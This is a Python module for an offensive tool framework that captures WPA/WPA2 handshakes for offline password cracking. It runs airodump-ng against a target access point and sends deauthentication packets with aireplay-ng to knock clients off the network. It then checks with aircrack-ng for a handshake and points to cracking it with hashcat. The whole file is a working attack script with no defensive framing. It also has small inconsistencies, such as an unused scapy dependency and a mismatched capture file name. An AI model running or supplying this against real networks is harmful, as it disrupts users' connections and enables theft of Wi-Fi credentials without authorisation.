#!/usr/bin/env python3

MODULE_INFO = {
    "name": "WPA Handshake Capture",
    "description": "Capture WPA/WPA2 handshakes for offline cracking",
    "author": "Lazy Framework",
    "license": "MIT",
    "dependencies": ["scapy"],
    "platform": "Linux",
    "rank": "Normal",
}

OPTIONS = {
    "interface": {
        "description": "Wireless interface in monitor mode",
        "required": True,
        "default": "wlan0mon"
    },
    "target_bssid": {
        "description": "Target access point BSSID",
        "required": True,
        "default": ""
    },
    "output_file": {
        "description": "Output file for captured handshake",
        "required": False,
        "default": "handshake.pcap"
    },
    "timeout": {
        "description": "Capture timeout in seconds",
        "required": False,
        "default": "60"
    },
    "deauth_count": {
        "description": "Number of deauth packets to send",
        "required": False,
        "default": "10"
    }
}

def run(session, options):
    from rich.console import Console
    from rich.panel import Panel
    import time
    import subprocess
    
    console = Console()
    interface = options.get("interface", "wlan0mon")
    target_bssid = options.get("target_bssid", "")
    output_file = options.get("output_file", "handshake.pcap")
    timeout = int(options.get("timeout", 60))
    deauth_count = int(options.get("deauth_count", 10))
    
    if not target_bssid:
        console.print("[red]Error: target_bssid is required[/red]")
        return
    
    console.print(Panel.fit(
        f"[bold]WPA Handshake Capture[/bold]\n"
        f"Interface: [cyan]{interface}[/cyan]\n"
        f"Target: [yellow]{target_bssid}[/yellow]\n"
        f"Output: [green]{output_file}[/green]\n"
        f"Timeout: [red]{timeout}s[/red]"
    ))
    
    try:
        # Start capture in background
        console.print("[yellow]Starting packet capture...[/yellow]")
        capture_proc = subprocess.Popen(
            ["airodump-ng", "-c", "1-11", "--bssid", target_bssid, 
             "-w", output_file.replace('.pcap', ''), interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(5)  # Wait for airodump to start
        
        # Send deauth packets
        console.print("[yellow]Sending deauthentication packets...[/yellow]")
        deauth_proc = subprocess.run(
            ["aireplay-ng", "--deauth", str(deauth_count), 
             "-a", target_bssid, interface],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        # Wait for handshake
        console.print(f"[yellow]Waiting for handshake (timeout: {timeout}s)...[/yellow]")
        start_time = time.time()
        handshake_found = False
        
        while time.time() - start_time < timeout:
            time.sleep(2)
            # Check if handshake was captured
            result = subprocess.run(
                ["aircrack-ng", output_file],
                capture_output=True,
                text=True
            )
            
            if "handshake" in result.stdout.lower():
                handshake_found = True
                break
        
        # Stop capture
        capture_proc.terminate()
        
        if handshake_found:
            console.print(Panel.fit(
                "[bold green]✓ WPA Handshake successfully captured![/bold green]\n"
                f"File: [cyan]{output_file}[/cyan]\n"
                "You can now use aircrack-ng or hashcat to crack the password.",
                border_style="green"
            ))
        else:
            console.print(Panel.fit(
                "[bold red]✗ No handshake captured within timeout period[/bold red]",
                border_style="red"
            ))
            
    except Exception as e:
        console.print(f"[red]Error during handshake capture: {e}[/red]")
        console.print("[yellow]Make sure you have aircrack-ng installed and interface is in monitor mode[/yellow]")
